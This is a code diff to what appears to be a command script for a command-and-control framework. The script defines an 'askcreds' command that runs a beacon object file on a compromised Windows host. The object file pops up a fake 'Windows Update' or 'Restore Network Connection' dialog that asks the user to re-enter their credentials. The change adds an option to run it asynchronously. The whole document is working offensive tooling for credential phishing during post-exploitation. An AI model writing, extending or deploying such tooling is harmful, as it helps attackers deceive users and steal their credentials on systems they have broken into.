@@ -9,6 +9,7 @@ ax.script_import(ax.script_dir() + "cookie-monster/cookie-monster.axs")
 /// COMMANDS
 
 var cmd_askcreds = ax.create_command("askcreds", "Prompt for credentials", "askcreds -p \"Windows Update\"");
+cmd_askcreds.addArgBool("--async", "Use Async BOF");
 cmd_askcreds.addArgFlagString("-p", "prompt",    "", "Restore Network Connection");
 cmd_askcreds.addArgFlagString("-n", "note",      "", "Please verify your Windows user credentials to proceed");
 cmd_askcreds.addArgFlagInt(   "-t", "wait_time", "", 30);
@@ -16,11 +17,14 @@ cmd_askcreds.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
     let prompt    = parsed_json["prompt"];
     let note      = parsed_json["note"];
     let wait_time = parsed_json["wait_time"];
+    let async = "";
+    if (parsed_json["--async"]) async = "-a ";
+
 
     let bof_params = ax.bof_pack("wstr,wstr,int", [prompt, note, wait_time]);
     let bof_path = ax.script_dir() + "_bin/askcreds." + ax.arch(id) + ".o";
 
-    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, "BOF implementation: askcreds");
+    ax.execute_alias(id, cmdline, `execute bof ${async}"${bof_path}" ${bof_params}`, "BOF implementation: askcreds");
 });
 
 
